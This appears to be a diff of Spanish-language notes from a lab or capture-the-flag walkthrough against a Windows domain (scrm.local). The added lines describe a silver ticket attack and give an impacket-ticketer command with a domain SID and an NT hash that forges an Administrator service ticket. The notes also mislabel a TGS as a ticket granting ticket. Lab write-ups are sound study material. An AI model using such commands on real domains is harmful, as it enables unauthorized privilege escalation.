@@ -196,10 +196,14 @@ vamos a obtener el domain-sid
 ![[Pasted image 20240401224209.png]]
 
 `Domain-SID`
+
 ![[Pasted image 20240401224251.png]]
 
 ### impacket-tiketer
-de esta manera realizamos un `SILVER TICKET ATTACK` para obtener un `TGS (TICKET GRANTING TICKET` del usuario
+de esta manera realizamos un `SILVER TICKET ATTACK` para obtener un `TGS (TICKET GRANTING TICKET` del usuario Administrator
+```python
+impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local
+```
 ![[Pasted image 20240401232926.png]]
 
 
